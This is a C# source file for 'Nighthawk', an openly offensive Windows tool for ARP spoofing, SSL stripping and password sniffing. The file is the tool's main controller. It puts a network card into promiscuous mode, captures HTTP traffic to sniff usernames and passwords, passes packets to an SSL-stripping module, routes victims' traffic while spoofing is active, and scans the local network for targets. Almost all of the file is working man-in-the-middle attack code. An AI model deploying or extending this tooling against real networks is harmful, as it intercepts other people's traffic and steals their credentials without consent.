using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.IO;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Media;
using SharpPcap;
using PacketDotNet;

/**
Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2010  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    public class Main
    {
        // our network interface
        public LivePcapDevice Device;

        // list of devices (DeviceInfo)
        public List<DeviceInfo> DeviceInfoList = new List<DeviceInfo>();
        private DeviceInfo deviceInfo;

        // GUI
        public MainWindow Window;

        // modules
        public Sniffer Sniffer;
        public ARPTools ARPTools;
        public SSLStrip SSLStrip;

        // OUI's
        public Dictionary<string, string> Vendors = new Dictionary<string, string>();

        // device status
        public bool Started = false;

        // last paragraph
        private string lastResultText = string.Empty;
        private string lastSSLText = string.Empty;

        // constructor
        public Main(MainWindow window)
        {
            Window = window;
        }

        // returns a collection of network interfaces
        public List<string> GetInterfaces()
        {
            var devices = new List<string>();

            // clear DeviceInfo list
            DeviceInfoList.Clear();

            // try to check for WinPcap???
            var error = false;

            try
            {
                var instance = LivePcapDeviceList.Instance[0];
                if (instance == null) error = true;
            } catch {
                error = true;
            }

            if(error) {
                MessageBox.Show("WinPcap not installed or no devices detected!", "Nighthawk error",
                            MessageBoxButton.OK, MessageBoxImage.Error);

                return new List<string>();
            }
            //

            foreach (var device in LivePcapDeviceList.Instance)
            {
                // get IPv4 address, subnet mask and broadcast address
                var address = "";
                var subnet = "";
                var broadcast = "";

                foreach (var addr in device.Addresses)
                {
                    if (addr.Addr.ipAddress != null)
                    {
                        if (addr.Addr.ipAddress.AddressFamily == AddressFamily.InterNetwork)
                        {
                            address = addr.Addr.ipAddress.ToString();
                            subnet = addr.Netmask.ipAddress.ToString();
                            broadcast = addr.Broadaddr.ipAddress.ToString();
                        }
                    }
                }

                
                DeviceInfoList.Add(new DeviceInfo { CIDR = (int)Network.MaskToCIDR(subnet), IP = address, Mask = subnet, Broadcast = broadcast });
                devices.Add(" IP: " + address + "/" + Network.MaskToCIDR(subnet) + "  " + device.Description);
            }

            return devices;
        }

        // start listening on a device
        public void StartDevice(int deviceIndex)
        {
            Started = true;

            deviceInfo = DeviceInfoList[deviceIndex];
            Device = LivePcapDeviceList.Instance[deviceIndex];            

            // initialize modules
            Sniffer = new Sniffer(Device);
            ARPTools = new ARPTools(Device);
            SSLStrip = new SSLStrip(Device);

            // module events
            Sniffer.OnSnifferResult += new SnifferResultHandler(sniffer_OnSnifferResult);
            ARPTools.OnArpResponse += new ArpResponseEventHandler(ARPTools_OnArpResponse);
            ARPTools.OnArpScanComplete += new ArpScanEventHandler(ARPTools_OnArpScanComplete);
            ARPTools.HostnameResolved += new HostnameResolvedHandler(ARPTools_HostnameResolved);
            SSLStrip.OnSSLStripped += new SSLStrip.SSLStripHandler(SSLStrip_OnSSLStripped);

            // open device
            Device.Open(DeviceMode.Promiscuous, 1);
            Device.Filter = "(arp || ip)";

            // bind capture event
            Device.OnPacketArrival += new PacketArrivalEventHandler(device_OnPacketArrival);

            // start
            Device.StartCapture();
        }

        // stop listening on a device
        public void StopDevice()
        {
            Started = false;

            Device.StopCaptureTimeout = TimeSpan.FromMilliseconds(200);
            Device.StopCapture();
            Device.Close();
        }

        // OUI database loader
        public void LoadOUI()
        {
            string[] dbLines = File.ReadAllLines("OUI.txt");

            // parse every line and fill "Vendors"
            foreach (var line in dbLines)
            {
                if (!line.StartsWith("#") && line.Length > 5)
                {
                    var macSegment = line.Substring(0, 8).Replace("-", "");
                    var vendor = line.Substring(18, line.Length - 18);

                    if(!Vendors.ContainsKey(macSegment)) Vendors.Add(macSegment, vendor);
                }
            }
        }

        // check for Vendor
        private string GetVendorFromMAC(string mac)
        {
            var macSegment = mac.Substring(0, 6);

            if (Vendors.ContainsKey(macSegment)) return Vendors[macSegment];
            
            return "";
        }

        // packet arrival event
        private void device_OnPacketArrival(object sender, CaptureEventArgs e)
        {
            // parse packet
            var packet = Packet.ParsePacket(e.Packet);

            // check only ethernet packets
            if (packet is EthernetPacket)
            {
                // decode packet as TCP, ARP, IP
                var tcp = TcpPacket.GetEncapsulated(packet);
                var arp = ARPPacket.GetEncapsulated(packet);
                var ip = IpPacket.GetEncapsulated(packet);

                // TCP packet
                if (tcp != null)
                {
                    // if we are likely to have a HTTP packet
                    if ((tcp.SourcePort == 80 || tcp.DestinationPort == 80) && ip.SourceAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        if (Sniffer.Started)
                        {
                            lock (Sniffer.PacketQueue)
                            {
                                Sniffer.PacketQueue.Add(tcp);
                            }
                        }

                        if (SSLStrip.Started)
                        {
                            SSLStrip.ProcessPacket(packet, tcp);
                        }
                    }
                }

                // ARP packet
                if (arp != null)
                {
                    if (ARPTools.ScanStarted)
                    {
                        lock (ARPTools.PacketQueue)
                        {
                            ARPTools.PacketQueue.Add(arp);
                        }
                    }
                }

                // IP packet (for routing)
                if (ip != null)
                {
                    // only route when IPv4 packet and ARP spoofing active
                    if (ARPTools.SpoofingStarted && ip.SourceAddress.AddressFamily == AddressFamily.InterNetwork)
                    {
                        lock (ARPTools.PacketRoutingQueue)
                        {
                            ARPTools.PacketRoutingQueue.Add(packet);
                        }
                    }
                }
            }
        }

        /* Module events */
        private delegate void UI();

        // sniffer result (username/password sniffed)
        private void sniffer_OnSnifferResult(string data, SnifferResult type)
        {
            // update GUI text
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                var resultText = new Run(data);

                // assign color
                if (type == SnifferResult.HTML)
                {
                    resultText.Foreground = new SolidColorBrush(Window.ColorSnifferHTML);
                }
                else if (type == SnifferResult.HTTPAuth)
                {
                    resultText.Foreground = new SolidColorBrush(Window.ColorSnifferHTTPAuth);
                }

                // change paragraph style
                var thickness = new Thickness(0, 0, 0, 5);
                var paragraph = new Paragraph(resultText);

                paragraph.Margin = thickness;

                // don't repeat entries
                if(lastResultText != data)
                {
                    lastResultText = data;
                    Window.TSnifferText.Document.Blocks.Add(paragraph);
                }
            }));
        }

        // arp response (new target)
        private void ARPTools_OnArpResponse(IPAddress ip, PhysicalAddress mac, string hostname)
        {
            // update GUI
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                var item = new ARPTarget { Hostname = hostname, IP = ip.ToString(), MAC = Network.FriendlyPhysicalAddress(mac), PMAC = mac, Vendor = GetVendorFromMAC(mac.ToString())};

                // exclude local IP
                if (ip.ToString() != deviceInfo.IP)
                {
                    if (!Window.ARPTargetList.ContainsIP(item.IP)) Window.ARPTargetList.Add(item);
                }
            }));
        }

        // arp scan completed
        private void ARPTools_OnArpScanComplete()
        {
            // update GUI
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                Window.BScanNetwork.IsEnabled = true;
                Window.BScanNetwork.Content = "Scan network";

                // check for target count to enable ARP spoofing button
                if (Window.ARPTargetList.Count > 0)
                {
                    Window.BStartARP.IsEnabled = true;
                }
            }));
        }


        // hostname resolved
        private void ARPTools_HostnameResolved(IPAddress ip, string hostname)
        {
            if (ARPTools.ResolveHostnames)
            {
                // update GUI
                Window.Dispatcher.BeginInvoke(new UI(delegate
                {
                    // check for local IP
                    if (ip.ToString() != deviceInfo.IP)
                    {
                        var target = Window.ARPTargetList.Where(t => t.IP == ip.ToString()).First();
                        target.Hostname = hostname;
                    }
                }));
            }
        }

        // SSL stripped
        private void SSLStrip_OnSSLStripped(string sourceIP, string destIP, List<string> changed)
        {
            // update GUI text
            Window.Dispatcher.BeginInvoke(new UI(delegate
            {
                // determine what has changed
                var changedText = string.Empty;

                foreach(var change in changed)
                {
                    if(change != changed.Last())
                    {
                        changedText += change + ", ";
                    } else {
                        changedText += change;
                    }
                }

                // build output string
                var text = "SSL stripped ("+ sourceIP +" -> "+ destIP +"): "+ changedText;
                var resultText = new Run(text);
                resultText.Foreground = new SolidColorBrush(Window.ColorSSLStrip);

                // change paragraph style
                var thickness = new Thickness(0, 0, 0, 5);
                var paragraph = new Paragraph(resultText);

                paragraph.Margin = thickness;

                // don't repeat entries
                if (lastSSLText != text)
                {
                    lastSSLText = text;

                    if(Window.TSSLText.Document.Blocks.Count > 0) {
                        Window.TSSLText.Document.Blocks.InsertBefore(Window.TSSLText.Document.Blocks.First(), paragraph);
                    } else {
                        Window.TSSLText.Document.Blocks.Add(paragraph);
                    }
                }
            }));
        }
    }

    // observable collection for ARP targets
    public class ARPTargetList : ObservableCollection<ARPTarget>
    {
        public bool ContainsIP(string ip)
        {
            foreach(ARPTarget target in this)
            {
                if (target.IP == ip) return true;
            }

            return false;
        }
    }

    public class ARPTarget : INotifyPropertyChanged
    {
        private string _IP;
        private string _MAC;
        private PhysicalAddress _PMAC;
        private string _Hostname;
        private string _Vendor;

        public event PropertyChangedEventHandler PropertyChanged;

        public string IP
        {
            get { return _IP; }
            set { _IP = value; }
        }

        public string MAC
        {
            get { return _MAC; }
            set { _MAC = value; }
        }

        public PhysicalAddress PMAC
        {
            get { return _PMAC; }
            set { _PMAC = value; }
        }

        public string Vendor
        {
            get { return _Vendor; }
            set { _Vendor = value; }
        }

        public string Hostname
        {
            get { return _Hostname; }
            set
            {
                _Hostname = value;
                OnPropertyChanged("Hostname");
            }
        }

        protected void OnPropertyChanged(string name)
        {
            PropertyChangedEventHandler handler = PropertyChanged;

            if (handler != null)
            {
                handler(this, new PropertyChangedEventArgs(name));
            }
        }
    }

    public class DeviceInfo
    {
        public string IP;
        public string Mask;
        public string Broadcast;
        public int CIDR;
    }
}
